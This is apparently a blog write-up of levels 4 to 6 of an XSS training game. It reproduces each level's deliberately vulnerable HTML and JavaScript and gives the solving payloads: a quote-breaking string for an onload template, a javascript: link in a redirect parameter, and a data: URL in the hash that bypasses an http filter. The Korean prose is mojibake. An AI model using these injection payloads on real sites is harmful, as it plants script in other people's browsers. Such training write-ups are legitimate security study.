---
title: "[2025-09-04] XSS game-2"
excerpt: "XSS game"

categories:
  - Problem
tags:
  - [XSS]

permalink: /Problem/[2025-09-04] XSS game-2/

toc: true
toc_sticky: true

date: 2025-09-04
last_modified_at: 2025-09-04
---

## ğŸ¦¥ ë³¸ë¬¸

### 4

- index.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <form action="" method="GET">
      <input id="timer" name="timer" value="3">
      <input id="button" type="submit" value="Create timer"> </form>
    </form>
  </body>
</html>
```

- timer.html

```html
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
 
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
    <br>
    <div id="message">Your timer will execute in {{ timer }} seconds.</div>
  </body>
</html>
```

í•´ë‹¹ ì½”ë“œë¥¼ ë³´ë©´ timer ê°’ì„ ë°›ê³  ë‹¤ìŒê³¼ ê°™ì´ í…œí”Œë¦¿ìœ¼ë¡œ ì‹¤í–‰í•œë‹¤

```html
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

ê·¸ë ‡ê¸° ë•Œë¬¸ì— timer ê°’ì— ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ë„£ìœ¼ë©´ `');alert('1` ì„ ë„£ìœ¼ë©´ XSSê°€ ëœë‹¤.

![image.png](https://yunseo10987.github.io/assets/images/posts_img/2025-09-04%20XSS%20game/image.png)

### 5

- confirm.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    Thanks for signing up, you will be redirected soon...
    <script>
      setTimeout(function() { window.location = '{{ next }}'; }, 5000);
    </script>
  </body>
</html>
```

- signup.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    <img src="/static/logos/level5.png" /><br><br>
    <!-- We're ignoring the email, but the poor user will never know! -->
    Enter email: <input id="reader-email" name="email" value="">
 
    <br><br>
    <a href="{{ next }}">Next >></a>
  </body>
</html>
```

- welcome.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level5">
    Welcome! Today we are announcing the much anticipated<br><br>
    <img src="/static/logos/level5.png" /><br><br>
 
    <a href="/level5/frame/signup?next=confirm">Sign up</a> 
    for an exclusive Beta.
  </body>
</html>
```

`next` ê°’ì„ ë„£ì–´ì„œ ë„£ì–´ì„œ `<a herf>` ë¥¼ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì´ë‹¤. `next` ê°’ì— ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ë„£ìœ¼ë©´ XSSê°€ ëœë‹¤.

```html
javascript: alert()
```

![image.png](https://yunseo10987.github.io/assets/images/posts_img/2025-09-04%20XSS%20game/image-1.png)

### 6

- index.html

```html
<!doctype html>
<html>
Â Â <head>
Â Â Â Â <!-- Internal game scripts/styles, mostly boring stuff -->
Â Â Â Â <script src="/static/game-frame.js"></script>
Â Â Â Â <link rel="stylesheet" href="/static/game-frame-styles.css" />
Â 
Â Â Â Â <script>
Â Â Â Â function setInnerText(element, value) {
Â Â Â Â Â Â if (element.innerText) {
Â Â Â Â Â Â Â Â element.innerText = value;
Â Â Â Â Â Â } else {
Â Â Â Â Â Â Â Â element.textContent = value;
Â Â Â Â Â Â }
Â Â Â Â }
Â 
Â Â Â Â function includeGadget(url) {
Â Â Â Â Â Â var scriptEl = document.createElement('script');
Â 
Â Â Â Â Â Â // This will totally prevent us from loading evil URLs!
Â Â Â Â Â Â if (url.match(/^https?:\/\//)) {
Â Â Â Â Â Â Â Â setInnerText(document.getElementById("log"),
Â Â Â Â Â Â Â Â Â Â "Sorry, cannot load a URL containing \"http\".");
Â Â Â Â Â Â Â Â return;
Â Â Â Â Â Â }
Â 
Â Â Â Â Â Â // Load this awesome gadget
Â Â Â Â Â Â scriptEl.src = url;
Â 
Â Â Â Â Â Â // Show log messages
Â Â Â Â Â Â scriptEl.onload = function() { 
Â Â Â Â Â Â Â Â setInnerText(document.getElementById("log"),Â  
Â Â Â Â Â Â Â Â Â Â "Loaded gadget from " + url);
Â Â Â Â Â Â }
Â Â Â Â Â Â scriptEl.onerror = function() { 
Â Â Â Â Â Â Â Â setInnerText(document.getElementById("log"),Â  
Â Â Â Â Â Â Â Â Â Â "Couldn't load gadget from " + url);
Â Â Â Â Â Â }
Â 
Â Â Â Â Â Â document.head.appendChild(scriptEl);
Â Â Â Â }
Â 
Â Â Â Â // Take the value after # and use it as the gadget filename.
Â Â Â Â function getGadgetName() { 
Â Â Â Â Â Â return window.location.hash.substr(1) || "/static/gadget.js";
Â Â Â Â }
Â 
Â Â Â Â includeGadget(getGadgetName());
Â 
Â Â Â Â // Extra code so that we can communicate with the parent page
Â Â Â Â window.addEventListener("message", function(event){
Â Â Â Â Â Â if (event.source == parent) {
Â Â Â Â Â Â Â Â includeGadget(getGadgetName());
Â Â Â Â Â Â }
Â Â Â Â }, false);
Â 
Â Â Â Â </script>
Â Â </head>
Â 
Â Â <body id="level6">
Â Â Â Â <img src="/static/logos/level6.png">
Â Â Â Â <img id="cube" src="/static/level6_cube.png">
Â Â Â Â <div id="log">Loading gadget...</div>
Â Â </body>
</html>
```

í•„í„°ë§ì„ ìš°íšŒí•˜ì—¬ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ë„ ìˆë‹¤. 

data URL scheme ë°©ì‹ì€ data:[ë¯¸ë””ì–´íƒ€ì…][;ì¸ì½”ë”©ë°©ì‹],<ë°ì´í„°>. ì™¸ë¶€ì—ì„œ ê°€ì ¸ì˜¤ëŠ” ê²ƒ ëŒ€ì‹ ì— ë°ì´í„°ë¥¼ URL ì— í¬í•¨ì‹œí‚¤ëŠ” ë°©ì‹ì´ë‹¤. 

```html
data:text/javascript,alert(1)
```

í•´ë‹¹ ê°’ì„ í•´ì‹œ ê°’ì— ë„£ìœ¼ë©´ XSSê°€ ëœë‹¤.

![image.png](https://yunseo10987.github.io/assets/images/posts_img/2025-09-04%20XSS%20game/image-2.png)